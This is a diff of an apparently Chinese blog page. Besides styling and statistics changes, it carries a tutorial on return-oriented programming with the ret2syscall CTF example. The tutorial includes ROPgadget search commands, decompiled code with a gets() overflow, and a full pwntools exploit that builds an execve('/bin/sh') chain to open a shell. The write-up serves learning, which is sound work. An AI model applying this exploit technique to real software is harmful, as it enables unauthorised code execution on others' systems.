@@ -28,7 +28,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
 
 
 <body>
@@ -405,7 +405,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        7 分
+                        6 分
                     </div>
                     
                 
@@ -424,92 +424,98 @@
                 <h4 id="随着-NX-保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是-ROP-Return-Oriented-Programming-，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段-gadgets-来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓-gadgets-就是以-ret-结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为-ROP，是因为核心在于利用了指令集中的-ret-指令，改变了指令流的执行顺序。ROP-攻击一般得满足如下条件"><a href="#随着-NX-保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是-ROP-Return-Oriented-Programming-，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段-gadgets-来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓-gadgets-就是以-ret-结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为-ROP，是因为核心在于利用了指令集中的-ret-指令，改变了指令流的执行顺序。ROP-攻击一般得满足如下条件" class="headerlink" title="随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件"></a>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</h4><pre><code>程序存在溢出，并且可以控制返回地址。
 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</code></pre><p>首先我们想想如果nx是关闭的我们可以通过构造shellcode放入栈中，再转跳的buf上即可执行我们的shellcode。而打开shell的函数是system（“/bin/sh”）或execve（“/bin/sh”）等。那么问题来了，我们这段ShellCode里面并没有system这个函数，是谁实现了“system(“/bin/sh”)”的效果呢。在网上查了一些资料大致就是：<br>EAX, EBX, ECX, EDX四个寄存器被先后清零，EAX被赋值为0Xb，ECX入栈，“/bin//sh”字符串入栈，并将其首地址赋给了EBX，最后执行完int 80h</p>
 <p>int指令的功能是调用系统中断，所以int 80h就是调用128号中断，在32位的linux系统中，该中断被用于呼叫系统调用程序system_call( )。我们知道出于对硬件和操作系统内核的保护，应用程序的代码一般在保护模式下运行。<br>在这个模式下我们使用的程序和写的代码是没办法访问内核空间的。但是我们显然可以通过调用read( ), write( )之类的函数从键盘读取输入，把其保存在硬盘里的文件中。那么read( ), write( )之类的函数是怎么突破保护模式的管制，成功访问到本该由内核管理的这些硬件呢？<br>答案就在于int 80h这个中断调用。不同的内核态操作通过给寄存器设置不同的值，再调用同样的指令int 80h，就可以通知内核完成不同的功能。而read( ), write( ), system( )之类的需要内核“帮忙”的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。32位linux系统的内核一共提供了0~337号共计338种系统调用用以实现不同的功能。<br>Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。<br>以下是一个简单的hello world程序</p>
-<pre><code>.section .data
+<pre class=" language-bash"><code class="language-bash">.section .data
 msg:
-        .ascii &quot;Hello world!\n&quot;
+        .ascii <span class="token string">"Hello world!\n"</span>
 .section .text
 .globl _start
 _start:
-        movl $4, %eax
-        movl $1, %ebx
-        movl $msg, %ecx
-        movl $13, %edx
-        int $0x80
-        movl $1, %eax
-        movl $0, %ebx
-        int $0x80
-</code></pre><h3 id="从-usr-include-asm-unistd-h中可以看到exit的功能号-NR-exit为1，write-NR-write-功能号为4，因此第一个int-0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int-0x80之前eax为1表示调用exit，ebx为0表示返回0。"><a href="#从-usr-include-asm-unistd-h中可以看到exit的功能号-NR-exit为1，write-NR-write-功能号为4，因此第一个int-0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int-0x80之前eax为1表示调用exit，ebx为0表示返回0。" class="headerlink" title="从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int 0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int 0x80之前eax为1表示调用exit，ebx为0表示返回0。"></a>从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int 0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int 0x80之前eax为1表示调用exit，ebx为0表示返回0。</h3><h2 id="我们常用的："><a href="#我们常用的：" class="headerlink" title="我们常用的："></a>我们常用的：</h2><pre><code>1. sys_exit
-Syntax: int sys_exit(int status)
-Source: kernel/exit.c
-Action: terminate the current process
-Details: status is return code
+        movl <span class="token variable">$4</span>, %eax
+        movl <span class="token variable">$1</span>, %ebx
+        movl <span class="token variable">$msg</span>, %ecx
+        movl <span class="token variable">$13</span>, %edx
+        int <span class="token variable">$0x80</span>
+        movl <span class="token variable">$1</span>, %eax
+        movl <span class="token variable">$0</span>, %ebx
+        int <span class="token variable">$0x80</span>
+</code></pre>
+<h3 id="从-usr-include-asm-unistd-h中可以看到exit的功能号-NR-exit为1，write-NR-write-功能号为4，因此第一个int-0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int-0x80之前eax为1表示调用exit，ebx为0表示返回0。"><a href="#从-usr-include-asm-unistd-h中可以看到exit的功能号-NR-exit为1，write-NR-write-功能号为4，因此第一个int-0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int-0x80之前eax为1表示调用exit，ebx为0表示返回0。" class="headerlink" title="从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int 0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int 0x80之前eax为1表示调用exit，ebx为0表示返回0。"></a>从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int 0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int 0x80之前eax为1表示调用exit，ebx为0表示返回0。</h3><h2 id="我们常用的："><a href="#我们常用的：" class="headerlink" title="我们常用的："></a>我们常用的：</h2><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> sys_exit
+Syntax<span class="token punctuation">:</span> <span class="token keyword">int</span> <span class="token function">sys_exit</span><span class="token punctuation">(</span><span class="token keyword">int</span> status<span class="token punctuation">)</span>
+Source<span class="token punctuation">:</span> kernel<span class="token operator">/</span>exit<span class="token punctuation">.</span>c
+Action<span class="token punctuation">:</span> terminate the current process
+Details<span class="token punctuation">:</span> status is <span class="token keyword">return</span> code
 
-3. sys_read
-Syntax: ssize_t sys_read(unsigned int fd, char * buf, size_t count)
-Source: fs/read_write.c
-Action: read from a file descriptor
-Details:
+<span class="token number">3</span><span class="token punctuation">.</span> sys_read
+Syntax<span class="token punctuation">:</span> ssize_t <span class="token function">sys_read</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span>
+Source<span class="token punctuation">:</span> fs<span class="token operator">/</span>read_write<span class="token punctuation">.</span>c
+Action<span class="token punctuation">:</span> read from a file descriptor
+Details<span class="token punctuation">:</span>
 
-4. sys_write
-Syntax: ssize_t sys_write(unsigned int fd, const char * buf, size_t count)
-Source: fs/read_write.c
-Action: write to a file descriptor
-Details:
+<span class="token number">4</span><span class="token punctuation">.</span> sys_write
+Syntax<span class="token punctuation">:</span> ssize_t <span class="token function">sys_write</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span>
+Source<span class="token punctuation">:</span> fs<span class="token operator">/</span>read_write<span class="token punctuation">.</span>c
+Action<span class="token punctuation">:</span> write to a file descriptor
+Details<span class="token punctuation">:</span>
 
-11. sys_execve
-Syntax: int sys_execve(struct pt_regs regs)
-Source: arch/i386/kernel/process.c
-Action: execute program
-Details:</code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3TOts.png" alt=""></p>
+<span class="token number">11</span><span class="token punctuation">.</span> sys_execve
+Syntax<span class="token punctuation">:</span> <span class="token keyword">int</span> <span class="token function">sys_execve</span><span class="token punctuation">(</span><span class="token keyword">struct</span> pt_regs regs<span class="token punctuation">)</span>
+Source<span class="token punctuation">:</span> arch<span class="token operator">/</span>i386<span class="token operator">/</span>kernel<span class="token operator">/</span>process<span class="token punctuation">.</span>c
+Action<span class="token punctuation">:</span> execute program
+Details<span class="token punctuation">:</span></code></pre>
+<p><img src="https://s1.ax1x.com/2020/06/01/t3TOts.png" alt=""></p>
 <p>很容易发现ShellCode中的EAX = 0Xb = 11，EBX = &amp;(“/bin//sh”), ECX = EDX = 0，即执行了sys_execve(“/bin//sh”, 0, 0, 0)，通过/bin/sh软链接打开一个shell，所以我们可以在没有system函数的情况下打开shell。</p>
 <h3 id="简单地说，只要我们把对应获取-shell-的系统调用的参数放到对应的寄存器中，那么我们在执行-int-0x80-就可执行对应的系统调用。"><a href="#简单地说，只要我们把对应获取-shell-的系统调用的参数放到对应的寄存器中，那么我们在执行-int-0x80-就可执行对应的系统调用。" class="headerlink" title="简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。"></a>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。</h3><p>比如我们像得到shell可以执行这个函数：execve(“/bin/sh”,NULL,NULL)<br>那么：其中，该程序是 32 位，所以我们需要使得</p>
 <pre><code>系统调用号，即 eax 应该为 0xb
 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
 第二个参数，即 ecx 应该为 0
 第三个参数，即 edx 应该为 0</code></pre><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
-<pre><code>ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;  //搜寻pop eax 和ret
-ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;  //搜寻pop ebx 和ret
-ROPgadget --binary rop  --string &#39;/bin/sh&#39;   //还可以找字符串，那当然也可以找system函数如果有的话
-ROPgadget --binary rop  --only &#39;int&#39;   //这个主要找 int 80h这个指令</code></pre><p>找到完地址后：<br><img src="https://s1.ax1x.com/2020/06/01/t3TzcV.png" alt=""><br>根据以上思路把payload像上面这样构造就好了<br>实战：ret2syscall这个例子<br>32位程序<br><img src="https://s1.ax1x.com/2020/06/01/t3TXhn.png" alt=""><br>IDA：</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int v4; // [sp+1Ch] [bp-64h]@1
+<pre class=" language-bash"><code class="language-bash">ROPgadget --binary rop  --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'eax'</span>  //搜寻pop eax 和ret
+ROPgadget --binary rop  --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'ebx'</span>  //搜寻pop ebx 和ret
+ROPgadget --binary rop  --string <span class="token string">'/bin/sh'</span>   //还可以找字符串，那当然也可以找system函数如果有的话
+ROPgadget --binary rop  --only <span class="token string">'int'</span>   //这个主要找 int 80h这个指令</code></pre>
+<p>找到完地址后：<br><img src="https://s1.ax1x.com/2020/06/01/t3TzcV.png" alt=""><br>根据以上思路把payload像上面这样构造就好了<br>实战：ret2syscall这个例子<br>32位程序<br><img src="https://s1.ax1x.com/2020/06/01/t3TXhn.png" alt=""><br>IDA：</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>
 
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(stdin, 0, 1, 0);
-  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);
-  puts(&quot;What do you plan to do?&quot;);
-  gets(&amp;v4);
-  return 0;
-}</code></pre><p>溢出点就没搞步骤了：112个字符，既然没有system还开启了NX    那就用rop吧<br>因为没有system函数，那么我们就得构造execve的ROP链：<br>找pop eax ；ret 指令<br><img src="https://s1.ax1x.com/2020/06/01/t3Tvpq.png" alt=""><br>我们选第二个</p>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>溢出点就没搞步骤了：112个字符，既然没有system还开启了NX    那就用rop吧<br>因为没有system函数，那么我们就得构造execve的ROP链：<br>找pop eax ；ret 指令<br><img src="https://s1.ax1x.com/2020/06/01/t3Tvpq.png" alt=""><br>我们选第二个</p>
 <p>找pop ebx；ret指令<br><img src="https://s1.ax1x.com/2020/06/01/t37CBF.png" alt=""><br>这里我们选倒数第5个：</p>
-<pre><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret //这个直接把另外两个包括了，我们构造的时候注意参数位置即可</code></pre><p>找int 80h指令<br><img src="https://s1.ax1x.com/2020/06/01/t379nU.png" alt=""></p>
+<pre class=" language-bash"><code class="language-bash">0x0806eb90 <span class="token keyword">:</span> pop edx <span class="token punctuation">;</span> pop ecx <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret //这个直接把另外两个包括了，我们构造的时候注意参数位置即可</code></pre>
+<p>找int 80h指令<br><img src="https://s1.ax1x.com/2020/06/01/t379nU.png" alt=""></p>
 <p>还有/bin/sh字符串<br><img src="https://s1.ax1x.com/2020/06/01/t37SXT.png" alt=""></p>
 <p>万事具备！！<br>构造exp：</p>
-<pre><code>from pwn import*
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 
-#0x080bb196 : pop eax ; ret
+<span class="token comment" spellcheck="true">#0x080bb196 : pop eax ; ret</span>
 
-pop_eax_ret = 0x080bb196
-
-
-#0x080be408 : /bin/sh
-binsh_addr = 0x080be408
-
-#0x08049421 : int 0x80
+pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bb196</span>
 
 
+<span class="token comment" spellcheck="true">#0x080be408 : /bin/sh</span>
+binsh_addr <span class="token operator">=</span> <span class="token number">0x080be408</span>
 
-#0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
-pop_edx_pop_ecx_pop_ebx_ret = 0x0806eb90
+<span class="token comment" spellcheck="true">#0x08049421 : int 0x80</span>
 
-payload = &quot;A&quot;*112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_pop_ecx_pop_ebx_ret) + p32(0) + p32(0) + p32(binsh_addr)  + p32(0x08049421)
 
-sh = process(&quot;ret2syscall&quot;)
 
-sh.sendline(payload)
+<span class="token comment" spellcheck="true">#0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span>
+pop_edx_pop_ecx_pop_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806eb90</span>
 
-sh.interactive()</code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3Tx10.png" alt=""></p>
+payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx_pop_ecx_pop_ebx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>  <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08049421</span><span class="token punctuation">)</span>
+
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"ret2syscall"</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="https://s1.ax1x.com/2020/06/01/t3Tx10.png" alt=""></p>
 <p>（系统调用功能好可以参考System Call Number Definition<br>以及<a href="http://asm.sourceforge.net/syscall.html#2" target="_blank" rel="noopener">http://asm.sourceforge.net/syscall.html#2</a><br>或者 <a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a> 查找(推荐!)</p>
 <p>启发：<a href="https://zhuanlan.zhihu.com/p/72951960（详细）" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/72951960（详细）</a></p>
 
@@ -688,14 +694,14 @@ sh.interactive()</code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3Tx10.
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">函数调用时栈中的变化 test示例代码:test.c
-#include &lt;stdio.h&gt;
+#include &lt;stdio.h>
 
 int fun(int a,int b)
 {
     return a + b;
 }
 
-int main(int argc, char</div>
+int main(int argc, char co</div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-02
@@ -867,7 +873,7 @@ int main(int argc, char</div>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.5k</span>
+                <span class="white-color">30k</span>
             
 
             
